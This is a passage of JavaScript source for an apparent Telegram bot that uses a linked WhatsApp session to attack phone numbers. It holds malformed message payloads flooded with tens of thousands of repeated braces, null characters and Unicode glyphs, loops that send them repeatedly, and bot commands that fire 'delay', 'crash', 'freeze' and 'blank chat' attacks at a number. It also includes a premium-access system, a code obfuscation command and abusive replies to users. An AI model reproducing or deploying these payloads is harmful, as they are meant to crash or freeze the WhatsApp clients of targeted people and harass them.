            mentionedJid: ["0@s.whatsapp.net",
                ...Array.from({ length: 2000 }, () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              questionMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            nativeFlowMessage: {
              messageParamJson: "{".repeat(20000),
            },
            buttons: [
            {
            name: "mpm",
              buttonParamsJson: "\u0000".repeat(20000),
            },
          ],
       },
    };
      
    await sock.relayMessage(target, MSG, {
      participant: { jid: target },
      messageId: null
    });
    console.log(chalk.red(`Succes Sending Bug Blank By XStrom-Flower To ${target}`));
}

async function XProtexBlankChatV5(target) {
  const MSG = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "Xx".repeat(10000),
      inviteExpiration: "99999999999",
      groupName: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ͜͡" + "ោ៝".repeat(10000),
      caption: "ោ៝".repeat(10000),
      contextInfo: {
      expiration: 1,
        ephemeralSettingTimestamp: 1,
        entryPointConversionSource: "WhatsApp.com",
        entryPointConversionApp: "WhatsApp",
        entryPointConversionDelaySeconds: 1,
          disappearingMode: {
            initiatorDeviceJid: target,
            initiator: "INITIATED_BY_OTHER",
            trigger: "UNKNOWN_GROUPS"
          },
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          mentionedJid: "0@s.whatsapp.net",
          questionMessage: {
          paymentInviteMessage: {
            serviceType: 1,
            expiryTimestamp: null
          }
        },
        externalAdReply: {
          showAdAttribution: false,
          renderLargerThumbnail: true
        }
      },
      body: {
        text: "⎋ 🦠</🧬⃟༑⌁⃰𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
      },
      nativeFlowMessage: {
        messageParamJson: "{".repeat(25000),
      },
        buttons: [
          {
            name: "cta_url",
            buttonParamJson: "\u0000".repeat(25000),
          },
        ],
      },
    };
  
  await sock.relayMessage(target, MSG, {
    participant: { jid: target },
    messageId: null,
  });
  console.log(chalk.red(`Succes Sending Bug Blank By XStrom-Flower To ${target}`));
  }
//CASE BUG DI SINI
async function XSTROMDELAY(target) {
for (let i = 0; i < 155; i++) {
await XStromDelayInvisible(target, false);
await new Promise((resolve) => setTimeout(resolve, 1000));
}
}

async function XSTROMCRASH(target) {
for (let i = 0; i < 15; i++) {
await XStromXCallVersion2(target);
await new Promise((resolve) => setTimeout(resolve, 1000));
await XProtexCallV7Galxy(target);
await new Promise((resolve) => setTimeout(resolve, 1000));
await XProtexXCallV6(target);
await new Promise((resolve) => setTimeout(resolve, 1000));
await XStromXCallGalaxy(target);
await new Promise((resolve) => setTimeout(resolve, 1000));
}
}

async function XSTROMFREEZE(target) {
for (let i = 0; i < 50; i++) {
await XStromFlowFreeze(target);
await new Promise((resolve) => setTimeout(resolve, 1000));
await XStromFlowerFreeze(target);
await new Promise((resolve) => setTimeout(resolve, 1000));
}
}

async function XSTROMBLANK(target) {
for (let i = 0; i < 15; i++) {
await XProtexBlankXDelay(target);
await new Promise((resolve) => setTimeout(resolve, 1000));
await XProtexBlankChatV4(target);
await new Promise((resolve) => setTimeout(resolve, 1000));
await XProtexBlankChatV5(target);
await new Promise((resolve) => setTimeout(resolve, 1000));
}
}
//BATAS CASE BUG
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;

  // Ambil tanggal sekarang
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;

  let ligma = `
\`\`\`𝗧𝗘𝗔𝗠
( 🍁 ) - 情報 𝗢𝗹𝗮𝗮 ─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。デジタルタスクを
┏╾ 𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧
┃ Vᴇʀsɪᴏɴ : 1.0
┃ Dᴇᴠᴇʟᴏᴘᴇʀ : @zyyimupp
┃ Tɪᴍᴇ : ${getOnlineDuration()}
┗━━━━━━━━━━━━━━━━━━━━━━┛
┏╾ 𝗜𝗻𝗳𝗼 𝗨𝘀𝗲𝗿
┃ Usᴇʀɴᴀᴍᴇ : ${senderName}
┃ ID ᴜsᴇʀ : ${senderId}
┃ Pᴏsɪᴛɪᴏɴ : ${whatsappStatus ? "Premium" : "No Access"}
┗━━━━━━━━━━━━━━━━━━━━━━┛\`\`\`
`;

  bot.sendPhoto(chatId, "https://files.catbox.moe/l0l6u5.jpg", {
      caption: ligma,
      parse_mode: "Markdown",
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "〢𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
                      callback_data: "bugmenu"
                  },
                  {
                      text: "〢𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮",
                      callback_data: "ownermenu"
                  }
              ],
              [
                  {
                      text: "〢𝐓𝐨𝐨𝐥𝐬",
                      callback_data: "toolsmenu"
                  }
              ],
              [
                  {
                      text: "〢𝐂𝐡𝐚𝐧𝐧𝐞𝐥",
                      url: "https://t.me/informasivaxzy"
                  }
              ]
          ]
      }
  });
});
bot.onText(/\/bugmenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
  let ligma = `
\`\`\`𝗧𝗘𝗔𝗠
( 🍁 ) - 情報 𝗢𝗹𝗮𝗮 ─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。デジタルタスクを
┏╾ 𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧
┃ Vᴇʀsɪᴏɴ : 1.0
┃ Dᴇᴠᴇʟᴏᴘᴇʀ : @zyyimupp
┃ Usᴇʀɴᴀᴍᴇ : ${senderName}
┃ ID ᴜsᴇʀ : ${senderId}
┃ Tɪᴍᴇ : ${getOnlineDuration()}
┗━━━━━━━━━━━━━━━━━━━━━━┛
┏╾ 𝗕𝘂𝗴 𝗔𝗿𝗲𝗮
┃ ⬡ /XFlow-Delay - 62xxx
┃ ╰➤ Delay Invisible
┃
┃ ⬡ /Flow-Crash - 62xxx
┃ ╰➤ Crash Force Ori
┃
┃ ⬡ /Flower-Freeze - 62xxx
┃ ╰➤ Freeze Delay
┃
┃ ⬡ /XFlower-Blank - 62xxx
┃ ╰➤ Blank Chat
┗━━━━━━━━━━━━━━━━━━━━━━┛
┏╾ 𝗡𝗼𝘁𝗲 :
┃ Jangan Di salah gunakan ya
┃ Gunakanlah Dengan Bijak...
┗━━━━━━━━━━━━━━━━━━━━━━┛\`\`\`
`;
  bot.sendPhoto(chatId, "https://files.catbox.moe/l0l6u5.jpg", {
      caption: ligma,
      parse_mode: "Markdown",
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                      url: "https://t.me/zyyimupp"
                  }
              ]
          ]
      }
  });
});
bot.onText(/\/ownermenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
  let ligma = `
\`\`\`𝗧𝗘𝗔𝗠
( 🍁 ) - 情報 𝗢𝗹𝗮𝗮 ─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。デジタルタスクを
┏╾ 𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧
┃ Vᴇʀsɪᴏɴ : 1.0
┃ Dᴇᴠᴇʟᴏᴘᴇʀ : @zyyimupp
┃ Usᴇʀɴᴀᴍᴇ : ${senderName}
┃ ID ᴜsᴇʀ : ${senderId}
┃ Tɪᴍᴇ : ${getOnlineDuration()}
┗━━━━━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━━━━━━━━━━━━━━━┓
┃ /addbot <Num>
┃ /addprem <ID>
┃ /delprem <ID>
┃ /addowner <ID>
┃ /delowner <ID>
┗━━━━━━━━━━━━━━━━━━━━━━┛
┏╾ 𝗡𝗼𝘁𝗲 :
┃ Apabila ada kendala dalam
┃ script ini, segera hubungi
┃ @zyyimupp
┗━━━━━━━━━━━━━━━━━━━━━━┛\`\`\`
`;
  bot.sendPhoto(chatId, "https://files.catbox.moe/l0l6u5.jpg", {
      caption: ligma,
      parse_mode: "Markdown",
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "༽𝗢𝘄𝗻𝗲𝗿༼",
                      url: "https://t.me/zyyimupp"
                  }
              ]
          ]
      }
  });
});
bot.onText(/\/toolsmenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
  let ligma = `
\`\`\`𝗧𝗘𝗔𝗠
( 🍁 ) - 情報 𝗢𝗹𝗮𝗮 ─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。デジタルタスクを
┏╾ 𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧
┃ Vᴇʀsɪᴏɴ : 1.0
┃ Dᴇᴠᴇʟᴏᴘᴇʀ : @zyyimupp
┃ Usᴇʀɴᴀᴍᴇ : ${senderName}
┃ ID ᴜsᴇʀ : ${senderId}
┃ Tɪᴍᴇ : ${getOnlineDuration()}
┗━━━━━━━━━━━━━━━━━━━━━━┛
┏╾ 𝐓𝐨𝐨𝐥𝐬 𝗠𝗲𝗻𝘂
┃ /fixedbug <Num>
┃ /encrypthard <Tag File>
┃ /cooldown <Num>
┗━━━━━━━━━━━━━━━━━━━━━━┛
┏╾ 𝗡𝗼𝘁𝗲 :
┃ Apabila ada kendala dalam
┃ script ini, segera hubungi
┃ @zyyimupp
┗━━━━━━━━━━━━━━━━━━━━━━┛\`\`\`
`;
  bot.sendPhoto(chatId, "https://files.catbox.moe/l0l6u5.jpg", {
      caption: ligma,
      parse_mode: "Markdown",
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                      url: "https://t.me/zyyimupp"
                  }
              ]
          ]
      }
  });
});
//========================================================\\ 
bot.onText(/\/addbot(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  if (!owner.includes(senderId)) {
    return bot.sendMessage(chatId, "❌Lu Bukan Owner Tolol!!!")
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Pakai Code Negara Bego\nContoh Nih Njing: /addbot 62×××.");
}
const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(chatId, "❌ Contoh Nih Njing : /addbot 62×××.");
}

await getSessions(bot, chatId, numberTarget)
});

bot.onText(/^\/fixedbug\s+(.+)/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, 'Lu Gak Punya Access Tolol...');
    }

    const q = match && match[1] ? match[1].trim() : null;
    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\nContoh: /fixedbug 62xxx`);
    }

    let pepec = q.replace(/[^0-9]/g, "");
    if (!pepec.startsWith("62")) {
        return bot.sendMessage(chatId, `Contoh : /fixedbug 62xxx`);
    }

    const target = `${pepec}@s.whatsapp.net`;
    const clearBugText = "OVERLOAD CLEAR BUG\n\n" + "\n".repeat(300) + "OVERLOAD CLEAR BUG";

    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { text: clearBugText });
        }
        bot.sendMessage(chatId, "Done Clear Bug By Vampire!!!");
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});
bot.onText(/\/cooldown (\d+)m/i, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Pastikan hanya owner yang bisa mengatur cooldown
  if (!owner.includes(senderId)) {
    return bot.sendMessage(chatId, "Lu Siapa Ngentot...\nGak ada hak gunain fitur ini");
  }

  // Pastikan match[1] ada dan valid
  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❌ Masukkan waktu cooldown yang valid dalam format angka diikuti 'm'. Contoh: /cooldown 10m");
  }

  const newCooldown = parseInt(match[1], 10);
  if (isNaN(newCooldown) || newCooldown <= 0) {
    return bot.sendMessage(chatId, "❌ Masukkan waktu cooldown yang valid dalam menit.");
  }

  cooldownTime = newCooldown * 60; // Ubah ke detik
  return bot.sendMessage(chatId, `✅ Cooldown time successfully set to ${newCooldown} menit.`);
});

//CMD BUG NYA DI SINI
bot.onText(/\/XFlow-Delay(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu Goblok!!!");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!! Bukan Premium Mau Access Bot");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /XFlow-Delay 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /XFlow-Delay 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/l0l6u5.jpg", {
        caption: `
\`\`\`
┏────⌦ 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 ⌫─────┓
│ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
│ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ʙᴜɢ
│ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗───────────────────────┛\`\`\`
`,
        parse_mode: "Markdown",
    });

    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
        await XSTROMDELAY(formatedNumber);
        await console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim! 🚀");
    }

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/l0l6u5.jpg", {
        caption: `
\`\`\`
┏───⌦ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 ⌫───┓
│❒ Tᴀʀɢᴇᴛ : ${numberTarget}
│❒ Cᴏᴍᴍᴀɴᴅ : /XFlow-Delay
│❒ Jᴇᴅᴀ : 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗──────────────────────────┛\`\`\`
`,
       parse_mode: "MarkdownV2",
    });
});

bot.onText(/\/Flow-Crash(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu Goblok!!!");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!! Bukan Premium Mau Access Bot");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /Flow-Crash 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /Flow-Crash 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/l0l6u5.jpg", {
        caption: `
\`\`\`
┏────⌦ 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 ⌫─────┓
│ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
│ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ʙᴜɢ
│ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗───────────────────────┛\`\`\`
`,
       parse_mode: "Markdown",
    });

    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
        await XSTROMCRASH(formatedNumber);
        await console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim! 🚀");
    }

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/l0l6u5.jpg", {
        caption: `
\`\`\`
┏───⌦ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 ⌫───┓
│❒ Tᴀʀɢᴇᴛ : ${numberTarget}
│❒ Cᴏᴍᴍᴀɴᴅ : /Flow-Crash
│❒ Jᴇᴅᴀ : 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗──────────────────────────┛\`\`\`
`,
       parse_mode: "MarkdownV2",
    });
});

bot.onText(/\/Flower-Freeze(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu Goblok!!!");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!! Bukan Premium Mau Access Bot");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /Flower-Freeze 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /Flower-Freeze 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/l0l6u5.jpg", {
        caption: `
\`\`\`
┏────⌦ 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 ⌫─────┓
│ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
│ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ʙᴜɢ
│ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗───────────────────────┛\`\`\`
`,
       parse_mode: "Markdown",
    });

    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
        await XSTROMFREEZE(formatedNumber);
        await console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim! 🚀");
    }

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/l0l6u5.jpg", {
        caption: `
\`\`\`
┏───⌦ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 ⌫───┓
│❒ Tᴀʀɢᴇᴛ : ${numberTarget}
│❒ Cᴏᴍᴍᴀɴᴅ : /Flower-Freeze
│❒ Jᴇᴅᴀ : 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗──────────────────────────┛\`\`\`
`,
       parse_mode: "MarkdownV2",
    });
});

bot.onText(/\/XFlower-Blank(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu Goblok!!!");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!! Bukan Premium Mau Access Bot");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /XFlower-Blank 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /XFlower-Blank 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/l0l6u5.jpg", {
        caption: `
\`\`\`
┏────⌦ 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 ⌫─────┓
│ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
│ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ʙᴜɢ
│ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗───────────────────────┛\`\`\`
`,
        parse_mode: "Markdown",
    });

    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
        await XSTROMBLANK(formatedNumber);
        await console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim! 🚀");
    }

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/l0l6u5.jpg", {
        caption: `
\`\`\`
┏───⌦ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 ⌫───┓
│❒ Tᴀʀɢᴇᴛ : ${numberTarget}
│❒ Cᴏᴍᴍᴀɴᴅ : /XFlow-Delay
│❒ Jᴇᴅᴀ : 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗──────────────────────────┛\`\`\`
`,
       parse_mode: "MarkdownV2",
    });
});
//BATAS CMD BUG
bot.onText(/\/encrypthard/, async (msg) => {
    const chatId = msg.chat.id;
    const replyMessage = msg.reply_to_message;

    console.log(`Perintah diterima: /encrypthard dari pengguna: ${msg.from.username || msg.from.id}`);

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return bot.sendMessage(chatId, '😡 Silakan Balas/Tag File .js\nBiar Gua Gak Salah Tolol.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    // Mendapatkan link file
    const fileLink = await bot.getFileLink(fileId);
    const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
    const codeBuffer = Buffer.from(response.data);

    // Simpan file sementara
    const tempFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(tempFilePath, codeBuffer);

    // Enkripsi kode menggunakan JsConfuser
    bot.sendMessage(chatId, "⌛️Sabar...\n Lagi Di Kerjain Sama Vaxzy Encryptnya...");
    const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function () {
            const originalString = "肀VampireIsBack舀" + "肀VampireIsBack舀";
            function removeUnwantedChars(input) {
                return input.replace(/[^a-zA-Z肀VampireIsBack舀]/g, '');
            }
            function randomString(length) {
                let result = '';
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                for (let i = 0; i < length; i++) {
                    result += characters.charAt(Math.floor(Math.random() * characters.length));
                }
                return result;
            }
            return removeUnwantedChars(originalString) + randomString(2);
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0.0,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: 1.0,
        shuffle: { hash: 0.0, true: 0.0 },
        stack: true,
        controlFlowFlattening: 1.0,
        opaquePredicates: 0.9,
        deadCode: 0.0,
        dispatcher: true,
        rgf: false,
        calculator: true,
        hexadecimalNumbers: true,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    });

    // Simpan hasil enkripsi
    const encryptedFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(encryptedFilePath, obfuscatedCode);

    // Kirim file terenkripsi ke pengguna
    bot.sendDocument(chatId, encryptedFilePath, {
        caption: `
❒━━━━━━༽𝗦𝘂𝗰𝗰𝗲𝘀𝘀༼━━━━━━❒
┃ - 𝗘𝗻𝗰𝗿𝘆𝗽𝘁 𝗛𝗮𝗿𝗱 𝗝𝘀𝗼𝗻 𝗨𝘀𝗲𝗱 -
❒━━━━━━━━━━━━━━━━━━━━❒`
    });
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !resellerUsers.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Lu Bukan Owner Atau Admin Tolol!!!");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Lu Salah Idiot!!!\nContoh Nih Njing : /addprem 62×××.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Lu Salah Goblok!!!\nContoh Nih Njing : /addprem 62×××.");
  }

  if (!premiumUsers.includes(userId)) {
      premiumUsers.push(userId);
      savePremiumUsers();
      console.log(`${senderId} Added ${userId} To Premium`)
      bot.sendMessage(chatId, `✅ Si Yatim Ini ${userId} Berhasil Mendapatkan Access Premium.`);
  } else {
      bot.sendMessage(chatId, `❌ Si Yatim Ini ${userId} Sudah Menjadi Premium.`);
  }
});
bot.onText(/\/delprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Lu Bukan Admin Atau Owner Tolol!!!");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Lu Salah Idiot!!!\nContoh Nih Njing : /delprem 62×××.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (premiumUsers.includes(userId)) {
      premiumUsers = premiumUsers.filter(id => id !== userId);
      savePremiumUsers();
      console.log(`${senderId} Dihapus ${userId} Dari Premium`)
      bot.sendMessage(chatId, `✅ Si Goblok Ini ${userId} Sudah Dihapus Dari Premium.`);
  } else {
      bot.sendMessage(chatId, `❌ Si Goblok Ini ${userId} Bukan Lagi Premium.`);
  }
});

bot.onText(/\/addowner(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !resellerUsers.includes(senderId) && !superVip.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Lu Ga Punya Access Tolol!!!");
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Lu Salah Idiot!!!\nContoh Nih Njing: /addowner 62×××.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
  if (isNaN(userId)) {
    return bot.sendMessage(chatId, "❌ Lu Salah Goblok!!!\nContoh Nih Njing: /addowner 62×××.");
  }

  if (!OwnerUsers.includes(userId)) {
    OwnerUsers.push(userId);
    saveOwnerUsers(); // Simpan perubahan ke superVip
    console.log(`${senderId} Added ${userId} To Owner`);
    bot.sendMessage(chatId, `✅ Si Yatim Ini ${userId} Berhasil Mendapatkan Access Owner.`);
  } else {
    bot.sendMessage(chatId, `❌ Si Yatim Ini ${userId} Sudah Menjadi Owner.`);
  }
});
bot.onText(/\/delowner(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Cek apakah user yang mengakses punya hak akses
  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !superVip.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Lu Gak Punya Access Tolol!!!");
  }

  // Cek input yang diberikan user
  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Lu Salah Idiot!!!\nContoh Nih Njing: /delowner 62×××.");
  }

  // Ambil ID user dari input dan validasi
  const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
  if (isNaN(userId)) {
    return bot.sendMessage(chatId, "❌ Masukkan ID yang valid.");
  }

  // Cek apakah user yang dimaksud adalah superVip (owner)
  if (OwnerUsers.includes(userId)) {
    // Hapus dari superVip dan simpan perubahan
    OwnerUsers = superVip.filter(id => id !== userId);
    saveOwnerUsers(); // Simpan data terbaru
    console.log(`${senderId} Menghapus ${userId} Dari Owner`);
    bot.sendMessage(chatId, `✅ Si Goblok Ini ${userId} Sudah Dihapus Dari Owner.`);
  } else {
    bot.sendMessage(chatId, `❌ Si Goblok Ini ${userId} Bukan Owner.`);
  }
});
bot.on("callback_query", async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
